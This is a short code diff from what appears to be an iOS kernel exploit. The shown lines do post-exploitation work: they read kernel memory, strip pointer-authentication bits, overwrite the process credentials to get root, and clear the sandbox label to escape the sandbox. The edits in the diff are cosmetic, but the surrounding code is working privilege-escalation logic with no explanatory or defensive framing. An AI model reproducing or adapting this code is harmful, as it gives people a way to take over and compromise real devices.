@@ -378,7 +378,7 @@ stage1:
     uint64_t task = task_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", task_pac, task);
     #if defined(__arm64e__)
-        uint64_t proc_pac = read_64(task + 0x3A0);
+        uint64_t proc_pac = read_64(task + 0x3a0);
     #else
         uint64_t proc_pac = read_64(task + 0x390);
     #endif
@@ -395,20 +395,19 @@ stage1:
     uint32_t creds[5] = {0, 0, 0, 1, 0};
     uint32_t buffer[5] = {0, 0, 0, 1, 0};
     write_20(ucred + 0x18, (void*)creds);
-    static unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
-    static unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label
+    static unsigned off_ucred_cr_uid = 0x18;
+    static unsigned off_ucred_cr_label = 0x78;
     static unsigned off_sandbox_slot = 0x10;
     uint32_t uid = getuid();
+    uint32_t pid = getpid();
+    printf("getpid() returns %u \n", pid);
     cicuta_log("getuid() returns %u", uid);
     cicuta_log("whoami: %s", uid == 0 ? "root" : "mobile");
-    cicuta_log("Check for escaping sandbox");
     printf("Escaping sandbox.\n");
     uint64_t cr_label_pac = read_64(ucred + off_ucred_cr_label);
     uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
     printf("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
     write_20(cr_label + off_sandbox_slot, (void*)buffer);
-    uint32_t pid = getpid();
-    printf("getpid() returns %u \n", pid);
 err:
     //free(redeem_racers);
     cicuta_log("Out.");
